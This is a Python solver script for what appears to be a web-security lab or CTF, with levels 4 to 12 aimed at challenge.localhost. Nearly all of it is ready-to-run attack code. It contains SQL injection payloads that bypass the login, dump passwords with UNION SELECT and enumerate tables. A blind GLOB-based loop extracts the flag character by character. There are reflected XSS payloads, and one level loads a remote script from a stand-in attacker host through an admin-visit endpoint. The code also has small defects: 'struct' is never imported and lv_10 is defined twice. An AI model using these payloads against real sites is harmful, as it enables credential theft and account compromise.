#!/usr/bin/env python

import requests

def get_POST_result(url = 'http://challenge.localhost:80', data = None, print_out = True):
    response = requests.post(url, data)
    if(print_out):
        print(response.text)
    return response.text

def lv_4():
    data = {
        'username': 'flag";--',
        'password': '123'
    }
    get_POST_result(data = data)

def get_GET_result(url = 'http://challenge.localhost:80', args = '', print_out = True):
    response = requests.get(url + args)
    if(print_out):
        print(response.text)
    return response.text

def lv_5():
    get_GET_result(args = '?query=%" UNION ALL SELECT password FROM users; --')

def lv_6():
    response_str = get_GET_result(args = '?query=%" UNION ALL SELECT name FROM sqlite_master WHERE type=\'table\'; --')
    table_name = response_str.split('\n')[-2]
    get_GET_result(args = '?query=%" UNION ALL SELECT password FROM ' + table_name + '; --')

def lv_7():
    flag_prefix = ''
    while(True):
        ch = ''
        for i in range(32, 127):
            ch = struct.pack("B", i).decode('utf-8')
            if(ch == '*' or ch == '?'):
                continue
            cur_prefix = flag_prefix + ch
            data = {
                'username': 'flag" AND password GLOB "' + cur_prefix + '*"; --',
                'password': '123'
            }
            res = get_POST_result(data = data, print_out = False)
            if('Hello' in res):
                flag_prefix = cur_prefix
                print(flag_prefix)
                break
            if(i == 126):
                flag_prefix = flag_prefix + '?'
                print(flag_prefix)
                break
        if(ch == '}'):
            break

def lv_8():
    base_url  = 'http://challenge.localhost:80'
    
    echo_path = '/echo'
    echo_args = '?echo=<script>alert("x");</script>'
    get_GET_result(base_url + echo_path, echo_args)

    visit_path = '/visit'
    visit_args = f'?url={base_url}{echo_path}{echo_args}'
    get_GET_result(base_url + visit_path, visit_args)

def lv_9():
    base_url  = 'http://challenge.localhost:80'
    
    echo_path = '/echo'
    echo_args = '?echo=</textarea><script>alert("x")</script><textarea>'
    get_GET_result(base_url + echo_path, echo_args)

    visit_path = '/visit'
    visit_args = f'?url={base_url}{echo_path}{echo_args}'
    get_GET_result(base_url + visit_path, visit_args)

def lv_10():
    base_url  = 'http://challenge.localhost:80'
    
    echo_path = '/echo'
    echo_args = '?echo=1'
    get_GET_result(base_url + echo_path, echo_args)

    visit_path = '/visit'
    visit_args = f'?url={base_url}/leak'
    get_GET_result(base_url + visit_path, visit_args)

    get_GET_result(base_url + '/info', '?user=1')

def lv_10():
    base_url  = 'http://challenge.localhost:80'
    visit_path = '/visit'
    visit_args = f'?url={base_url}/leak'
    get_GET_result(base_url + visit_path, visit_args)

    get_GET_result(base_url + '/info', '?user=1')

def lv_11():
    server_url = 'http://challenge.localhost:80'
    hacker_url = 'http://hacker.localhost:8776'
    visit_path = '/visit'
    visit_args = f'?url={hacker_url}?redirect={server_url}/leak'
    get_GET_result(server_url + visit_path, visit_args)

    get_GET_result(server_url + '/info', '?user=1')

def lv_12():
    server_url = 'http://challenge.localhost:80'
    hacker_url = 'http://hacker.localhost:8776'
    visit_path = '/visit'
    visit_args = f'?url={hacker_url}'
    get_GET_result(server_url + visit_path, visit_args)
    get_GET_result(server_url + '/info', '?user=1')

def remote_script():
    # run `python -m http.server 8776 --bind hacker.localhost` before executing this
    server_url = 'http://challenge.localhost:80'
    visit_path = '/visit'
    visit_args = f'?url={server_url}/echo?echo=<script src="http://hacker.localhost:8776/hacker_script.js"></script>'
    get_GET_result(server_url + visit_path, visit_args)
